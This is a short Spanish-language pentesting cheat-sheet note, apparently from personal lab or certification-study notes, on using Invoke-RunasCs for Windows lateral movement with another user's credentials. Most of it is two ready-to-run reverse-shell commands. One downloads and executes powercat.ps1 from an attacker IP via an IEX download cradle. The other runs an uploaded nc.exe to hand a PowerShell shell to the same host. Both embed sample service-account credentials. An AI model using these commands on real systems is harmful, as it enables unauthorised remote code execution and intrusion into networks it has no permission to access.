---
title: RunAS - Invoke-RunasCs
tags: [ad, runas, lateral-movement, windows]
---

# RunAS — Invoke-RunasCs

Permite ejecutar comandos como otro usuario cuando disponemos de sus credenciales pero no tenemos una sesión interactiva.

## Comandos

```powershell
# Ejecutar reverse shell con powercat
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220/powercat.ps1');powercat -c 192.168.45.220 -p 5555 -e cmd"
```

```powershell
# Ejecutar netcat directamente
Invoke-RunasCs -Username svc_mssql -Password trustno1 "cmd /c C:\xampp\htdocs\uploads\nc.exe 192.168.45.220 9001 -e powershell"
```

> [!tip] Cuándo usarlo
> Cuando tienes credenciales de otro usuario pero no puedes hacer un runas normal (sin GUI, sin sesión interactiva).

## Ver también
- [[Pass the Hash]]
- [[Token Impersonation]]
